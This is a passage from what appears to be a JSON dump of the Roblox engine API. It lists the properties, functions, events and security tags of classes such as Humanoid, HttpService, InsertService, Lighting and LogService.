criptSecurity","deprecated"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"EscapeKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"},{"Name":"modifiers","Type":"string"}],"Name":"KeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuClosed","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuOpened","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"ShowLeaveConfirmation","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"SpecialKey"},{"Name":"modifiers","Type":"string"}],"Name":"SpecialKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"msgType","Type":"UiMessageType"},{"Name":"newUiMessage","Type":"string"}],"Name":"UiMessageChanged","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"ReturnType":"void","Arguments":[{"Name":"title","Type":"string"},{"Name":"text","Type":"string"}],"Name":"SendCoreUiNotification","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"GuidRegistryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"HapticService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"GetMotor","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"IsMotorSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null}],"Name":"IsVibrationSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null},{"Type":"Tuple","Name":"vibrationValues","Default":null}],"Name":"SetMotor","tags":[],"Class":"HapticService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"HttpRbxApiService","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"}],"Name":"GetAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"}],"Name":"PostAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"HttpService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"HttpEnabled","tags":["LocalUserSecurity"],"Class":"HttpService"},{"ReturnType":"string","Arguments":[{"Type":"bool","Name":"wrapInCurlyBraces","Default":"true"}],"Name":"GenerateGUID","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"JSONDecode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"Variant","Name":"input","Default":null}],"Name":"JSONEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"UrlEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"nocache","Default":"false"}],"Name":"GetAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"},{"Type":"bool","Name":"compress","Default":"false"}],"Name":"PostAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Humanoid","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"AutoRotate","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"CameraOffset","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidDisplayDistanceType","type":"Property","Name":"DisplayDistanceType","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"Health","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HipHeight","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Jump","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"JumpPower","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"LeftLeg","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxHealth","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxSlopeAngle","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"MoveDirection","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"NameOcclusion","type":"Property","Name":"NameOcclusion","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"PlatformStand","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidRigType","type":"Property","Name":"RigType","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"RightLeg","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"SeatPart","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Sit","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"TargetPoint","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"Torso","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"WalkSpeed","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"WalkToPart","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"WalkToPoint","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"maxHealth","tags":["deprecated"],"Class":"Humanoid"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"AddCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"AddStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":"None"}],"Name":"ChangeState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"tool","Default":null}],"Name":"EquipTool","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"HumanoidStateType","Arguments":[],"Name":"GetState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null}],"Name":"GetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStatuses","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"HasCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"HasStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"moveDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null},{"Type":"Instance","Name":"part","Default":"nil"}],"Name":"MoveTo","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"RemoveCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"RemoveStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetClickToWalkEnabled","tags":["RobloxScriptSecurity"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"TakeDamage","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnequipTools","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"loadAnimation","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"takeDamage","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Climbing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[],"Name":"Died","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FallingDown","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FreeFalling","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"GettingUp","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"health","Type":"float"}],"Name":"HealthChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Jumping","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"reached","Type":"bool"}],"Name":"MoveToFinished","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"PlatformStanding","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Ragdoll","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Running","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"},{"Name":"currentSeatPart","Type":"Instance"}],"Name":"Seated","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"old","Type":"HumanoidStateType"},{"Name":"new","Type":"HumanoidStateType"}],"Name":"StateChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"state","Type":"HumanoidStateType"},{"Name":"isEnabled","Type":"bool"}],"Name":"StateEnabledChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Strafing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Swimming","tags":[],"Class":"Humanoid","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"InputObject","tags":["notCreatable"]},{"ValueType":"Vector3","type":"Property","Name":"Delta","tags":[],"Class":"InputObject"},{"ValueType":"KeyCode","type":"Property","Name":"KeyCode","tags":[],"Class":"InputObject"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"InputObject"},{"ValueType":"UserInputState","type":"Property","Name":"UserInputState","tags":[],"Class":"InputObject"},{"ValueType":"UserInputType","type":"Property","Name":"UserInputType","tags":[],"Class":"InputObject"},{"Superclass":"Instance","type":"Class","Name":"InsertService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AllowInsertFreeModels","tags":[],"Class":"InsertService"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"ApproveAssetId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"ApproveAssetVersionId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"instance","Default":null}],"Name":"Insert","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null},{"Type":"bool","Name":"user","Default":"false"}],"Name":"SetAdvancedResults","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetUrl","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetVersionUrl","Default":null}],"Name":"SetAssetVersionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"collectionUrl","Default":null}],"Name":"SetCollectionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeDecalUrl","Default":null}],"Name":"SetFreeDecalUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeModelUrl","Default":null}],"Name":"SetFreeModelUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"trustLevel","Default":null}],"Name":"SetTrustLevel","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"categoryId","Default":null}],"Name":"GetCollection","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeDecals","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeModels","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"GetLatestAssetVersionAsync","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"LoadAsset","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"LoadAssetVersion","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"loadAsset","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"InstancePacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"IntConstrainedValue","tags":[]},{"ValueType":"int","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MaxValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MinValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntConstrainedValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"IntValue","tags":[]},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"JointInstance","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"C0","tags":[],"Class":"JointInstance"},{"ValueType":"CoordinateFrame","type":"Property","Name":"C1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part0","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"part1","tags":["deprecated","hidden"],"Class":"JointInstance"},{"Superclass":"JointInstance","type":"Class","Name":"DynamicRotate","tags":[]},{"ValueType":"float","type":"Property","Name":"BaseAngle","tags":[],"Class":"DynamicRotate"},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateP","tags":[]},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateV","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Glue","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"F0","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F1","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F2","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F3","tags":[],"Class":"Glue"},{"Superclass":"JointInstance","type":"Class","Name":"ManualSurfaceJointInstance","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualGlue","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualWeld","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Motor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"Motor"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"value","Default":null}],"Name":"SetDesiredAngle","tags":[],"Class":"Motor","type":"Function"},{"Superclass":"Motor","type":"Class","Name":"Motor6D","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Rotate","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Snap","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"VelocityMotor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"Object","type":"Property","Name":"Hole","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"VelocityMotor"},{"Superclass":"JointInstance","type":"Class","Name":"Weld","tags":[]},{"Superclass":"Instance","type":"Class","Name":"JointsService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ClearJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CreateJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinInstance","Default":null}],"Name":"SetJoinAfterMoveInstance","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinTarget","Default":null}],"Name":"SetJoinAfterMoveTarget","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ShowPermissibleJoints","tags":[],"Class":"JointsService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Keyframe","tags":[]},{"ValueType":"float","type":"Property","Name":"Time","tags":[],"Class":"Keyframe"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddPose","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPoses","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemovePose","tags":[],"Class":"Keyframe","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequence","tags":[]},{"ValueType":"bool","type":"Property","Name":"Loop","tags":[],"Class":"KeyframeSequence"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"KeyframeSequence"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"AddKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetKeyframes","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"RemoveKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequenceProvider","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Content","Name":"assetId","Default":null}],"Name":"GetKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"useCache","Default":null}],"Name":"GetKeyframeSequenceById","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterActiveKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"page","Default":"1"}],"Name":"GetAnimations","tags":[],"Class":"KeyframeSequenceProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Light","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Light"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Shadows","tags":[],"Class":"Light"},{"Superclass":"Light","type":"Class","Name":"PointLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"PointLight"},{"Superclass":"Light","type":"Class","Name":"SpotLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SpotLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SpotLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SpotLight"},{"Superclass":"Light","type":"Class","Name":"SurfaceLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SurfaceLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SurfaceLight"},{"Superclass":"Instance","type":"Class","Name":"Lighting","tags":["notCreatable"]},{"ValueType":"Color3","type":"Property","Name":"Ambient","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Bottom","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Top","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"FogColor","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogEnd","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogStart","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"GeographicLatitude","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"GlobalShadows","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"OutdoorAmbient","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"Outlines","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ShadowColor","tags":[],"Class":"Lighting"},{"ValueType":"string","type":"Property","Name":"TimeOfDay","tags":[],"Class":"Lighting"},{"ReturnType":"double","Arguments":[],"Name":"GetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetMoonDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMoonPhase","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSunDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"SetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"getMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"setMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"Arguments":[{"Name":"skyboxChanged","Type":"bool"}],"Name":"LightingChanged","tags":[],"Class":"Lighting","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LocalWorkspace","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"LogService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"source","Default":null}],"Name":"ExecuteScript","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetLogHistory","tags":[],"Class":"LogService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestServerOutput","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"}],"Name":"MessageOut","tags":[],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"},{"Name":"timestamp","Type":"int"}],"Name":"ServerMessageOut","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LoginService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"Logout","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PromptLogin","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"Arguments":[{"Name":"loginError","Type":"string"}],"Name":"LoginFailed","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Arguments":[{"Name":"username","Type":"string"}],"Name":"LoginSucceeded","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LuaSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreScriptStartsReported","tags":[],"Class":"LuaSettings"},{"ValueType":"double","type":"Property","Name":"DefaultWaitTime","tags":[],"Class":"